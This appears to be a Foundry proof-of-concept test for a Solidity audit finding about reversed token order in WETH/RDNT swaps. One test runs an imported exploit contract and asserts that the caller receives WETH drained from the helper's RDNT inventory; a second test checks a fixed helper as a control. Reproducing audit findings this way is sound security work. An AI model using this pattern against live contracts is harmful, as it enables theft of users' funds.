// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    Erc20,
    BalancerPool,
    BalancerPoolHelperFixed
} from "./31661-c-01-incorrect-token-order-passed-for-weth-rdnt-swaps-pashov.sol";

contract PoC_31661_ReversedRdntSwap is Test {
    uint256 internal constant AMOUNT = 100 ether;

    function test_reversed_swap_pays_weth_from_rdnt_inventory() public {
        Exploit exp = new Exploit();
        exp.run();

        assertEq(exp.weth().balanceOf(address(exp)), AMOUNT, "caller received WETH");
        assertEq(exp.rdnt().balanceOf(address(exp.helper())), 0, "RDNT inventory sold");
        assertEq(exp.helper().spentRdnt(), AMOUNT, "spent");
        assertEq(exp.helper().wethOut(), AMOUNT, "out");
    }

    function test_control_weth_in_rdnt_out_keeps_inventory() public {
        Erc20 weth = new Erc20("WETH");
        Erc20 rdnt = new Erc20("RDNT");
        BalancerPool pool = new BalancerPool();
        BalancerPoolHelperFixed helper = new BalancerPoolHelperFixed(address(rdnt), address(weth), address(pool));
        weth.mint(address(pool), 1000 ether);
        rdnt.mint(address(pool), 1000 ether);
        rdnt.mint(address(helper), AMOUNT);
        weth.mint(address(helper), AMOUNT);

        uint256 out = helper.swapWethToRdnt(AMOUNT, 0);

        assertEq(out, AMOUNT, "RDNT out");
        assertEq(rdnt.balanceOf(address(helper)), AMOUNT, "RDNT inventory untouched");
        assertEq(weth.balanceOf(address(helper)), 0, "WETH was the input");
        assertEq(rdnt.balanceOf(address(this)), AMOUNT, "caller received RDNT");
        assertEq(weth.balanceOf(address(this)), 0, "caller did not receive WETH");
    }
}
